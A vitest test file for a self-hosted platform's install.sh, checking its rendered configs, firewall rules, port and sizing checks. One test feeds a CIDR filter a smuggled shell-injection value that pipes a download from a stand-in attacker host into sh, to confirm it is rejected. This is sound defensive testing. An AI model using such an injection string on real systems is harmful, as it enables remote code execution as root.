// install.sh (WP6 packaging): the installer's --print-* modes render the stack's files as pure
// functions of flags and environment (no root, no side effects), so the contract between the script,
// src/config.ts and the compose stack is testable without a VM (plan 06 "Tests"; contract 00 §15).
// Everything that needs Docker lives in compose.int.test.ts and image.int.test.ts.
import { test, expect } from 'vitest'
import { execFileSync, spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { CONFIG_KEYS } from '../src/config'

const ROOT = join(__dirname, '..')
const SCRIPT = join(ROOT, 'install.sh')
const script = readFileSync(SCRIPT, 'utf8')

// A minimal environment: PATH plus the keys the case sets, so a developer's own INSTA_OSS_* variables
// never leak into an assertion (the script passes every INSTA_OSS_* it sees through to instad.env).
const baseEnv = { PATH: process.env.PATH ?? '/usr/bin:/bin' }
const run = (args: string[], env: Record<string, string> = {}): string =>
  execFileSync('sh', [SCRIPT, ...args], { env: { ...baseEnv, ...env }, encoding: 'utf8' })
const tryRun = (args: string[], env: Record<string, string> = {}) =>
  spawnSync('sh', [SCRIPT, ...args], { env: { ...baseEnv, ...env }, encoding: 'utf8' })

/** KEY=VALUE lines of a rendered instad.env (comments dropped). */
const parseEnv = (out: string): Record<string, string> =>
  Object.fromEntries(out.split('\n')
    .filter((l) => l !== '' && !l.startsWith('#'))
    .map((l) => { const i = l.indexOf('='); return [l.slice(0, i), l.slice(i + 1)] }))

const hasShellcheck = spawnSync('sh', ['-c', 'command -v shellcheck'], { encoding: 'utf8' }).status === 0

test('sh -n install.sh exits 0 (POSIX sh, not bash)', () => {
  const r = spawnSync('sh', ['-n', SCRIPT], { encoding: 'utf8' })
  expect(r.stderr).toBe('')
  expect(r.status).toBe(0)
  expect(script.startsWith('#!/usr/bin/env sh\n')).toBe(true)
  expect(script).toContain('set -eu')
})

test.skipIf(!hasShellcheck)('shellcheck -s sh install.sh is clean (CI runs the same command)', () => {
  const r = spawnSync('shellcheck', ['-s', 'sh', SCRIPT], { encoding: 'utf8' })
  expect(r.stdout + r.stderr).toBe('')
  expect(r.status).toBe(0)
})

test('--print-env writes every key loadConfig reads plus the stack-only keys, with the server defaults', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_SECRET: 'deadbeef' }))
  for (const k of CONFIG_KEYS) expect(env, `missing ${k}`).toHaveProperty(k)
  for (const k of ['INSTA_OSS_IMAGE', 'INSTA_OSS_VERSION', 'INSTA_OSS_TLS', 'INSTA_OSS_ACME_EMAIL']) expect(env).toHaveProperty(k)
  expect(env).toMatchObject({
    INSTA_OSS_MODE: 'server',
    INSTA_OSS_DOMAIN: 'example.test',
    INSTA_OSS_SECRET: 'deadbeef',
    INSTA_OSS_DATA_DIR: '/var/lib/instacloud',
    INSTA_OSS_LISTEN_HOST: '127.0.0.1',   // the edge is the only remote client (decision 3)
    INSTA_OSS_PORT: '8080',
    INSTA_OSS_INTERNAL_PORT: '8081',
    INSTA_OSS_TRUST_PROXY: '1',
    INSTA_OSS_AUTH: '1',
    INSTA_OSS_LANE_BIND: '0.0.0.0',
    INSTA_OSS_UI_DIST: '/app/ui/dist',    // where the Dockerfile puts them
    INSTA_OSS_TEMPLATES_DIR: '/app/templates',
    INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud',
    INSTA_OSS_TLS: 'acme',
    INSTA_OSS_ACME_EMAIL: '',
    INSTA_OSS_SCHEDULER: '1',
    INSTA_OSS_IDLE_COMPUTE_SEC: '300',
    INSTA_OSS_IDLE_DB_SEC: '600',
    INSTA_OSS_RAM_FLOOR_PCT: '15',
    INSTA_OSS_ALWAYS_ON_DEFAULT: '0',
  })
  // derived-while-empty keys stay empty so the daemon computes them from DOMAIN and DATA_DIR
  for (const k of ['INSTA_OSS_STATE', 'INSTA_OSS_GARAGE_CONFIG', 'INSTA_OSS_S3_HOST_ENDPOINT', 'INSTA_OSS_API_URL', 'INSTA_OSS_CONSOLE_URL', 'INSTA_OSS_TLS_CERT_DIR']) expect(env[k]).toBe('')
  // no key is written twice (compose's env_file would take the last one silently)
  const keys = run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' }).split('\n').filter((l) => /^INSTA_OSS_/.test(l)).map((l) => l.split('=')[0])
  expect(new Set(keys).size).toBe(keys.length)
  // print mode never mints a secret when the environment has none: a 64-hex one is generated
  const minted = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' })).INSTA_OSS_SECRET
  expect(minted).toMatch(/^[0-9a-f]{64}$/)
})

test('--print-env: precedence flag > environment > default; --version strips the v; an image tag is the version', () => {
  const flag = parseEnv(run(['--print-env', '--domain', 'flag.test', '--tls', 'internal', '--version', 'v1.2.3', '--email', 'ops@flag.test'],
    { INSTA_OSS_DOMAIN: 'env.test', INSTA_OSS_TLS: 'acme', INSTA_OSS_SECRET: 'x' }))
  expect(flag).toMatchObject({ INSTA_OSS_DOMAIN: 'flag.test', INSTA_OSS_TLS: 'internal', INSTA_OSS_VERSION: '1.2.3', INSTA_OSS_ACME_EMAIL: 'ops@flag.test' })
  const tagged = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud:ci' }))
  expect(tagged).toMatchObject({ INSTA_OSS_IMAGE: 'ghcr.io/insforge/instacloud', INSTA_OSS_VERSION: 'ci' })
  // A tag from INSTA_OSS_IMAGE keeps its leading v: it names a tag that exists, and stripping it
  // made the stack pull an image nobody built.
  const vtag = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IMAGE: 'instacloud:v0test' }))
  expect(vtag).toMatchObject({ INSTA_OSS_IMAGE: 'instacloud', INSTA_OSS_VERSION: 'v0test' })
  // ...while a v the operator typed is still stripped, from the flag and from the environment
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_VERSION: 'v9.9.9' })).INSTA_OSS_VERSION).toBe('9.9.9')
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'Example.TEST.' })).INSTA_OSS_DOMAIN).toBe('example.test')
})

test('--print-env rejects a bad --tls, a relative --data-dir, a malformed domain and an unknown flag', () => {
  expect(tryRun(['--print-env', '--tls', 'selfsigned'], { INSTA_OSS_DOMAIN: 'x.test' })).toMatchObject({ status: 1, stderr: expect.stringContaining('--tls must be acme or internal') })
  expect(tryRun(['--print-env', '--data-dir', 'relative/dir'], { INSTA_OSS_DOMAIN: 'x.test' })).toMatchObject({ status: 1, stderr: expect.stringContaining('absolute path') })
  expect(tryRun(['--print-env'], { INSTA_OSS_DOMAIN: 'bad_domain!' })).toMatchObject({ status: 1, stderr: expect.stringContaining('domain must match') })
  expect(tryRun(['--print-env'], { INSTA_OSS_PUBLIC_IP: 'not-an-ip' })).toMatchObject({ status: 1, stderr: expect.stringContaining('INSTA_OSS_PUBLIC_IP') })
  expect(tryRun(['--nope'])).toMatchObject({ status: 1, stderr: expect.stringContaining('unknown flag --nope') })
  expect(tryRun(['--help']).status).toBe(0)
})

test('INSTA_OSS_PUBLIC_IP=203.0.113.7 --print-env yields INSTA_OSS_DOMAIN=203-0-113-7.sslip.io', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_PUBLIC_IP: '203.0.113.7' }))
  expect(env.INSTA_OSS_DOMAIN).toBe('203-0-113-7.sslip.io')
  expect(env.INSTA_OSS_PUBLIC_IP).toBe('203.0.113.7')
  // an explicit domain wins over the auto one; the ip is still recorded for the daemon's DNS hints
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_PUBLIC_IP: '203.0.113.7', INSTA_OSS_DOMAIN: 'shop.example' })).INSTA_OSS_DOMAIN).toBe('shop.example')
})

test('pass-through: INSTA_OSS_IDLE_COMPUTE_SEC=15 and an unknown INSTA_OSS_* key land in --print-env', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IDLE_COMPUTE_SEC: '15', INSTA_OSS_FUTURE_KNOB: 'yes' }))
  expect(env.INSTA_OSS_IDLE_COMPUTE_SEC).toBe('15')
  expect(env.INSTA_OSS_FUTURE_KNOB).toBe('yes')
  // a non-INSTA_OSS variable is never written
  expect(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', HOME: '/root', SOMETHING_ELSE: '1' })).not.toMatch(/^(HOME|SOMETHING_ELSE)=/m)
})

test('--print-compose: host networking, the socket and the data dir bound at the identical path, the three container names, no ports on instad', () => {
  const out = run(['--print-compose'])
  expect(out).toContain('name: instacloud')
  expect(out).toContain('image: ${INSTA_OSS_IMAGE}:${INSTA_OSS_VERSION}')
  expect(out).toContain('- /var/run/docker.sock:/var/run/docker.sock')
  expect(out).toContain('- /var/lib/instacloud:/var/lib/instacloud')
  expect(out).toContain('env_file: instad.env')
  for (const c of ['io-instad', 'io-edge', 'io-garage']) expect(out).toContain(`container_name: ${c}`)
  const instad = out.slice(out.indexOf('  instad:'), out.indexOf('  edge:'))
  expect(instad).toContain('network_mode: host')
  expect(instad).toContain('init: true')
  expect(instad).toContain('stop_grace_period: 30s')
  expect(instad).toContain('restart: unless-stopped')
  expect(instad).not.toContain('ports:')
  const edge = out.slice(out.indexOf('  edge:'), out.indexOf('  garage:'))
  expect(edge).toContain('network_mode: host')
  expect(edge).toContain('- ./Caddyfile:/etc/caddy/Caddyfile:ro')
  expect(edge).toContain('/var/lib/instacloud/caddy/data:/data')     // the cert store the daemon reads (INSTA_OSS_TLS_CERT_DIR)
  const garage = out.slice(out.indexOf('  garage:'))
  expect(garage).not.toContain('network_mode: host')                 // stays on the bridge: the daemon attaches it to branch networks
  expect(garage).toContain('- 127.0.0.1:3900:3900')
  expect(garage).toContain('- 127.0.0.1:3902:3902')
  expect(garage).toContain('/var/lib/instacloud/garage/garage.toml:/etc/garage.toml:ro')
  // decision 46: the compose name must equal the handle the storage adapter execs into, which is
  // the one constant the adapter and the engine share.
  expect(readFileSync(join(ROOT, 'src', 'manageddb.ts'), 'utf8')).toContain("export const GARAGE_CONTAINER = 'io-garage'")
  expect(readFileSync(join(ROOT, 'src', 'adapters', 'garage.ts'), 'utf8')).toContain('const GARAGE = GARAGE_CONTAINER')
  // The data directory is the one value baked in, and on purpose: compose interpolation lets the
  // calling shell outrank --env-file, so a stray INSTA_OSS_DATA_DIR in an operator's environment
  // would move every bind above. The image and the version stay late-bound, so editing instad.env
  // is still how the running tag changes.
  const elsewhere = run(['--print-compose'], { INSTA_OSS_DATA_DIR: '/srv/x', INSTA_OSS_VERSION: '9.9.9' })
  expect(elsewhere).toContain('- /srv/x:/srv/x')
  expect(elsewhere).toContain('- /srv/x/garage/meta:/var/lib/garage/meta')
  expect(elsewhere).toContain('image: ${INSTA_OSS_IMAGE}:${INSTA_OSS_VERSION}')
  expect(elsewhere).not.toContain('9.9.9')
  expect(elsewhere).not.toContain('/var/lib/instacloud')
})

test('--print-caddyfile: ask on the internal port, on_demand, acme then internal; --tls internal drops issuer acme', () => {
  const acme = run(['--print-caddyfile'], { INSTA_OSS_TLS: 'acme' })
  expect(acme).toContain('ask http://127.0.0.1:8081/tls/ask')
  expect(acme).toContain('admin off')
  expect(acme).toContain('on_demand')
  expect(acme.indexOf('issuer acme')).toBeGreaterThan(-1)
  expect(acme.indexOf('issuer acme')).toBeLessThan(acme.indexOf('issuer internal'))
  expect(acme).toContain('reverse_proxy 127.0.0.1:8080')
  expect(acme).toContain('header_up X-Forwarded-Proto https')
  expect(acme).toContain('redir https://{host}{uri} permanent')
  expect(acme).not.toContain('email')                       // omitted when INSTA_OSS_ACME_EMAIL is empty
  const internal = run(['--print-caddyfile'], { INSTA_OSS_TLS: 'internal', INSTA_OSS_ACME_EMAIL: 'ops@example.test' })
  expect(internal).not.toContain('issuer acme')
  expect(internal).toContain('issuer internal')
  expect(internal).toContain('email ops@example.test')
  // the ports follow instad.env, not the defaults
  const moved = run(['--print-caddyfile'], { INSTA_OSS_PORT: '9080', INSTA_OSS_INTERNAL_PORT: '9081' })
  expect(moved).toContain('ask http://127.0.0.1:9081/tls/ask')
  expect(moved).toContain('reverse_proxy 127.0.0.1:9080')
})

test('curl and iproute2 are installed before anything is resolved, and the print modes skip that', () => {
  // A stock Ubuntu or Debian image has neither. Resolving the release tag and the public address
  // needs curl, and the offline address fallback and the port check need ip and ss, so a bootstrap
  // that ran after the resolve block turned a missing tool into "could not detect a public IPv4
  // address" on a box with perfectly good networking.
  const preflight = script.indexOf('preflight() {')
  expect(preflight).toBeGreaterThan(-1)
  expect(preflight).toBeLessThan(script.indexOf('detect_ip() {'))
  expect(preflight).toBeLessThan(script.indexOf('latest_release() {'))
  expect(script).toContain('[ -n "$PRINT" ] || preflight')
  expect(script).toContain('have curl || pkg_install curl || die')
  expect(script).toContain('pkg_install iproute2')
  // the print modes stay root-free: they must not go through preflight
  expect(run(['--print-daemon-json'])).toContain('default-address-pools')
})

test('systemd is detected by whether it runs the box, not by systemctl being on PATH', () => {
  // get.docker.com pulls systemd in as a dependency, so systemctl exists on hosts that boot
  // something else, where every unit call fails with "System has not been booted with systemd".
  expect(script).toContain('systemd_running() { have systemctl && [ -d /run/systemd/system ]; }')
  expect(script).not.toMatch(/if have systemctl; then systemctl/)
  expect(script).toContain('elif have service && [ -x /etc/init.d/docker ]; then service docker restart')
  // an installed but stopped daemon is started before the stack is touched
  expect(script).toContain('log "Docker is installed but not answering: starting it"')
})

test('.env is symlinked to instad.env so a plain docker compose in $CFG interpolates', () => {
  // compose interpolates ${VAR} from the shell and from .env in the project directory, never from
  // env_file, so without this every documented bare command there resolved the image to ':'.
  expect(script).toContain('ln -sfn instad.env "$CFG/.env"')
  const docs = readFileSync(join(ROOT, 'docs', 'self-hosting', 'install.mdx'), 'utf8')
  expect(docs).toContain('`/etc/instacloud/.env`')
  expect(docs).toContain('## Uninstall')
})

test('an auto domain that resolves somewhere other than this box says so', () => {
  expect(script).toContain('ip_is_local() {')
  expect(script).toContain('NAT_NOTE=')
  expect(script).toContain('[ -z "$NAT_NOTE" ] || log "  Note:     $NAT_NOTE"')
})

test('the fstab line makes docker.service wait for the data mount (decision 56)', () => {
  expect(script).toContain('"$IMG $DATA xfs loop,nofail,x-systemd.required-by=docker.service,x-systemd.before=docker.service 0 0"')
  expect(script).toContain('mkfs.xfs -q -m reflink=1')
  expect(script).toContain('cp --reflink=always')
})

test('--print-daemon-json renders the branch-network address pool; the script greps daemon.json before writing', () => {
  expect(JSON.parse(run(['--print-daemon-json']))).toEqual({ 'default-address-pools': [{ base: '10.100.0.0/14', size: 24 }] })
  expect(script).toMatch(/grep -q '"default-address-pools"' "\$DAEMON_JSON"/)
  expect(script).toContain('restart_docker')
})

test('--print-firewall lists the docker0 and inbound rules; the script gates them on ufw status / firewall-cmd --state', () => {
  const out = run(['--print-firewall'])
  expect(out).toContain('ufw allow in on docker0 to any port 443,5432,6379,27017 proto tcp')
  expect(out).toContain('ufw allow in on docker0 to any port 20000:20999 proto tcp')
  // 80, 443 and 5432 are the ONLY public ports, on purpose. The redis and mongodb lanes exist
  // and route by SNI, but they are opened to docker0 and the address pools only: an
  // internet-facing Redis or MongoDB on every self-hosted install is a default this project will
  // not ship, so a public lane for them is a rule the operator adds deliberately. The docs say
  // the same (docs/self-hosting/domains.mdx). If that ever changes it is an opt-in flag, and
  // this assertion is where it has to be changed on purpose.
  expect(out).toContain('ufw allow 80,443,5432/tcp')
  // The docker0 and address-pool rules DO carry 6379 and 27017; the public ones must not.
  expect(out).not.toMatch(/ufw allow [0-9,]*(?:6379|27017)/)
  expect(out).not.toMatch(/--zone=public[^\n]*(?:6379|27017)/)
  // branch networks are user-defined bridges, not docker0: the pool itself is allowed too
  expect(out).toContain('ufw allow from 10.100.0.0/14 to any port 443,5432,6379,27017 proto tcp')
  expect(out).toContain('firewall-cmd --permanent --zone=docker --add-port=443/tcp --add-port=5432/tcp --add-port=6379/tcp --add-port=27017/tcp --add-port=20000-20999/tcp')
  expect(out).toContain('firewall-cmd --permanent --zone=public --add-port=80/tcp --add-port=443/tcp --add-port=5432/tcp')
  expect(out).toContain('firewall-cmd --reload')
  expect(script).toMatch(/ufw status 2>\/dev\/null \| grep -q '\^Status: active'/)
  expect(script).toMatch(/firewall-cmd --state/)
  // ...and when it finds NEITHER it restricts nothing, so it has to say so rather than leave the
  // operator believing the lanes are private: they bind 0.0.0.0 in server mode, so 6379 and
  // 27017 are then only as private as the box's own security group. A warning, not a refusal:
  // most of these boxes are protected that way and refusing would break every such install.
  expect(script).toMatch(/no active ufw or firewalld found/)
  expect(script).toMatch(/redis \(6379\) and mongodb \(27017\)[^\n]*NOT meant to be public/)
  // ...and the applied rule set contains NO SSH rule at all. SSH policy belongs to the
  // operator: an installer that edits it either skips a rule the box needed or widens one that
  // was narrowed on purpose, and both have now happened here. This asserts the absence so the
  // auto-rule cannot be reintroduced by accident.
  expect(out).not.toMatch(/^ufw allow (OpenSSH|\d+\/tcp)$/m)
  expect(out).not.toMatch(/OpenSSH|allow 22\b/)
})

test('the ssh advisory names every port sshd listens on, before the enable', () => {
  // The advisory is the only place SSH is mentioned, and it is advice, not a rule. Every test
  // here injects the detection, so none of them reads the HOST's sshd or ufw: the previous
  // version asserted against whatever the machine running the suite happened to have, which
  // fails on exactly the hardened boxes this advice is for.
  const moved = run(['--print-ssh-advice'], { IO_SSH_PORTS: '2222' })
  expect(moved).toContain('ufw allow 2222/tcp')
  expect(moved).not.toContain('OpenSSH')
  // EVERY detected port, not the first: a box listening on two loses the one that is dropped.
  const both = run(['--print-ssh-advice'], { IO_SSH_PORTS: '22, 2222' })
  expect(both).toContain('ufw allow 22/tcp')
  expect(both).toContain('ufw allow 2222/tcp')
  // Each of them BEFORE the enable, which is the whole point of the ordering.
  expect(both.indexOf('ufw allow 2222/tcp')).toBeLessThan(both.indexOf('ufw enable'))
  // Nothing detected: nothing assumed. The app profile, and the substitution spelled out.
  const none = run(['--print-ssh-advice'], { IO_SSH_PORTS: ' ' })
  expect(none).toMatch(/ufw allow OpenSSH\s+# or your own SSH port/)
  expect(none.indexOf('OpenSSH')).toBeLessThan(none.indexOf('ufw enable'))
  // And the arm that prints it says whose job SSH is.
  expect(script).toMatch(/this script adds no SSH rule/)
  expect(script).toMatch(/ssh_advice \| while read/)
})

test('the run path: every port the daemon binds is refused, readiness on /healthz, the final lines', () => {
  // The router binds all three fixed lanes at startup and exits when one is taken, so a busy lane
  // port is a refusal that names the key that moves it, never a warning followed by a healthz
  // timeout. 3306 is not checked: server-mode MySQL takes a port out of the lane range.
  expect(script).toContain('need_port 80 ')
  expect(script).toContain('need_port 443 ')
  expect(script).toContain('need_port "$PORT" ')
  expect(script).toContain('need_port "$INTERNAL_PORT" ')
  expect(script).toContain('need_port "$LANE_PG" ')
  expect(script).toContain('need_port "$LANE_REDIS" ')
  expect(script).toContain('need_port "$LANE_MONGO" ')
  expect(script).toContain('INSTA_OSS_LANE_REDIS_PORT to another port')
  expect(script).not.toContain('for _p in 6379 3306 27017; do')
  expect(script).toContain('[ "$PORTS_BUSY" = 0 ] || die')
  // the lanes are checked where they are configured, not where they default to
  expect(script).toContain("LANE_PG=$(resolve INSTA_OSS_LANE_PG_PORT '' 5432)")
  expect(script).toContain('emit INSTA_OSS_LANE_REDIS_PORT "$LANE_REDIS"')
  expect(script).toContain('curl -fsSL https://get.docker.com | sh')
  expect(script).toContain('docker compose version')
  expect(script).toContain('up -d --remove-orphans')
  expect(script).toMatch(/"http:\/\/127\.0\.0\.1:\$PORT\/healthz"/)
  for (const line of [
    "log 'InstaCloud is running.'",
    'log "  Setup:    https://console.$DOMAIN/setup"',
    'log "  API:      https://api.$DOMAIN"',
    'log "  CLI:      insta login --api-key <token from the setup page> --api-url https://api.$DOMAIN"',
    'log "  Config $CFG   Data $DATA   Reflinks: $REFLINK"',
    "log 'Re-run this script to upgrade (add --version vX.Y.Z to pin).'",
  ]) expect(script).toContain(line)
  // --tls internal: the edge's root is copied where curl --cacert, PGSSLROOTCERT and NODE_EXTRA_CA_CERTS can use it
  expect(script).toContain('caddy/data/caddy/pki/authorities/local/root.crt')
  expect(script).toContain('"$DATA/edge/ca.pem"')
})

test('Dockerfile, .dockerignore, package.json and the workflows agree with the installer', () => {
  const dockerfile = readFileSync(join(ROOT, 'Dockerfile'), 'utf8')
  expect(dockerfile).toContain('INSTA_OSS_MODE=server')
  expect(dockerfile).toContain('INSTA_OSS_TEMPLATES_DIR=/app/templates')
  expect(dockerfile).toContain('INSTA_OSS_UI_DIST=/app/ui/dist')
  expect(dockerfile).toContain('COPY templates ./templates')
  expect(dockerfile).toContain('COPY --from=ui /app/ui/dist ./ui/dist')
  expect(dockerfile).toContain('COPY --from=dockercli /usr/local/bin/docker /usr/local/bin/docker')
  expect(dockerfile).toContain('CMD ["node", "node_modules/tsx/dist/cli.mjs", "src/main.ts"]')
  expect(dockerfile).toMatch(/^ARG NODE_IMAGE=node:22\.\d+\.\d+-bookworm-slim$/m)   // exact multi-arch pins
  expect(dockerfile).toMatch(/^FROM docker:28\.\d+\.\d+-cli AS dockercli$/m)
  expect(dockerfile).toMatch(/HEALTHCHECK[\s\S]*headers:\{host:'api\.'/)               // the router dispatches by Host (decision 4)
  const ignore = readFileSync(join(ROOT, '.dockerignore'), 'utf8').split('\n')
  for (const p of ['node_modules', 'ui/node_modules', 'ui/dist', 'templates/node_modules', '.git', 'test', 'docs', 'plans']) expect(ignore).toContain(p)
  // tsx is the runtime inside the image, so it is a dependency, not a dev one
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { version: string; scripts: Record<string, string>; dependencies: Record<string, string>; devDependencies: Record<string, string> }
  expect(pkg.dependencies.tsx).toBeDefined()
  expect(pkg.devDependencies.tsx).toBeUndefined()
  expect(pkg.scripts.start).toBe('tsx src/main.ts')
  expect(pkg.scripts['build:image']).toContain('docker build')
  expect(pkg.version).toMatch(/^\d+\.\d+\.\d+/)                                        // release source of truth
  const release = readFileSync(join(ROOT, '.github', 'workflows', 'release-image.yml'), 'utf8')
  expect(release).toContain("tags: ['v*']")
  expect(release).toContain('images: ghcr.io/insforge/instacloud')
  expect(release).toContain('platforms: linux/amd64,linux/arm64')
  expect(release).toContain('require(\'./package.json\').version')                      // tag must equal v<package.json version>
  const ci = readFileSync(join(ROOT, '.github', 'workflows', 'ci.yml'), 'utf8')
  const tail = ci.slice(ci.indexOf('# ---- WP6 ----'))
  expect(tail).toContain('shellcheck -s sh install.sh')
  expect(tail).toContain('docker build --build-arg VERSION=ci -t instacloud:ci .')
})

// `run_rules` evals each rendered firewall line as root, and those lines interpolate the address
// pool bases read out of /etc/docker/daemon.json, a file this script does not own. The two helpers
// below are the gate. They are sliced out of the shipped script rather than restated, so the test
// cannot drift away from what actually runs.
const cidrHelpers = (): string => {
  const start = script.indexOf('valid_cidr() {')
  const end = script.indexOf('POOL_BASES=$POOL_BASE_DEFAULT', start)
  expect(start, 'valid_cidr is gone from install.sh').toBeGreaterThan(0)
  expect(end).toBeGreaterThan(start)
  return `warn() { printf 'warning: %s\\n' "$*" >&2; }\n${script.slice(start, end)}`
}

test('only a CIDR block survives into the firewall lines the installer evals', () => {
  const keep = (input: string) =>
    spawnSync('sh', ['-c', `${cidrHelpers()}\nkeep_cidrs "$1"`, 'sh', input], { encoding: 'utf8' })

  expect(keep('10.100.0.0/14 172.16.0.0/12').stdout).toBe('10.100.0.0/14 172.16.0.0/12')
  // A base carrying shell metacharacters is dropped, loudly, and never reaches the eval.
  const hostile = keep('10.100.0.0/14 ;curl http://attacker.test|sh; $(id) `id`')
  expect(hostile.stdout).toBe('10.100.0.0/14')
  expect(hostile.stderr).toContain('not a CIDR block')
  expect(hostile.stdout).not.toContain('curl')
  // A bare address with no prefix length, and a name, are not CIDR blocks either.
  expect(keep('10.100.0.0 fd00::/8 example.test').stdout).toBe('')
})

// The documented minimums (2 vCPU, 2 GiB RAM, 15 GiB free) used to be enforced nowhere except the
// loop-image path, so an undersized box installed cleanly and failed later on an error that said
// nothing about sizing. The two readings behind the check are sliced out of the shipped script and
// run here, so the test cannot drift away from what the installer actually measures.
const sizingHelpers = (): string => {
  const start = script.indexOf('MEM_FLOOR_MIB=')
  const end = script.indexOf('check_resources() {', start)
  expect(start, 'the sizing check is gone from install.sh').toBeGreaterThan(0)
  expect(end).toBeGreaterThan(start)
  return script.slice(start, end)
}

test('the sizing check reads MemTotal and the free space of the filesystem that will hold the data', () => {
  const sh = (body: string, ...args: string[]) =>
    spawnSync('sh', ['-c', `${sizingHelpers()}\n${body}`, 'sh', ...args], { encoding: 'utf8' })

  const dir = mkdtempSync(join(tmpdir(), 'insta-sizing-'))
  // A box sold as 2 GiB reports a little under it, so the floor has to sit below 2048 MiB or every
  // documented-minimum machine would be refused. This is the MemTotal of a real 2 GiB cloud host.
  const twoGiB = join(dir, 'meminfo-2g')
  writeFileSync(twoGiB, 'MemTotal:        2007268 kB\nMemFree:          123456 kB\n')
  const mem2 = sh('mem_total_mib "$1"', twoGiB)
  expect(mem2.status).toBe(0)
  expect(Number(mem2.stdout.trim())).toBe(1960)
  expect(Number(mem2.stdout.trim())).toBeGreaterThanOrEqual(1900)   // passes the floor

  const oneGiB = join(dir, 'meminfo-1g')
  writeFileSync(oneGiB, 'MemTotal:        1010420 kB\n')
  expect(Number(sh('mem_total_mib "$1"', oneGiB).stdout.trim())).toBeLessThan(1900)   // refused

  // No MemTotal line, and no file at all: the reading fails rather than reporting 0, which is what
  // makes the caller skip the check instead of refusing the install.
  const empty = join(dir, 'meminfo-empty')
  writeFileSync(empty, 'SwapTotal: 0 kB\n')
  expect(sh('mem_total_mib "$1"', empty).status).not.toBe(0)
  expect(sh('mem_total_mib "$1"', join(dir, 'absent')).status).not.toBe(0)

  // free_gib walks up to the nearest existing ancestor, because the data directory is measured
  // before it is created: /var/lib/instacloud has to report /var/lib on a first install.
  const here = sh('free_gib "$1"', dir).stdout.trim()
  expect(here).toMatch(/^\d+$/)
  expect(sh('free_gib "$1"', join(dir, 'not', 'yet', 'there')).stdout.trim()).toBe(here)

  rmSync(dir, { recursive: true, force: true })
})

test('an undersized box is refused on a first install and only warned about on an upgrade', () => {
  // Not gated on STACK_UP the way the port check is: the ports are held by our own stack on a
  // re-run, memory and disk are not.
  expect(script).toContain('\ncheck_resources\n')
  expect(script).toMatch(/MEM_FLOOR_MIB=1900\nDISK_FLOOR_GIB=15\n/)
  const body = script.slice(script.indexOf('check_resources() {'), script.indexOf('\ncheck_resources\n'))
  expect(body).toContain('_mem=$(mem_total_mib)')
  expect(body).toContain('_free=$(free_gib "$DATA")')
  expect(body).toContain('if [ "$UPGRADE" = 1 ]; then')
  expect(body).toMatch(/UPGRADE" = 1 \]; then\n {4}warn /)     // an upgrade continues
  expect(body).toContain('die "this box is under the documented minimum')
  // one core runs, slowly: that one is a warning at every point, never a refusal
  expect(body).toMatch(/_cpu" -lt 2 \]; then warn /)
  // and the header the operator reads says the same numbers the code enforces
  expect(script).toContain('2 vCPU, 2 GiB RAM, 15 GiB free disk')
})
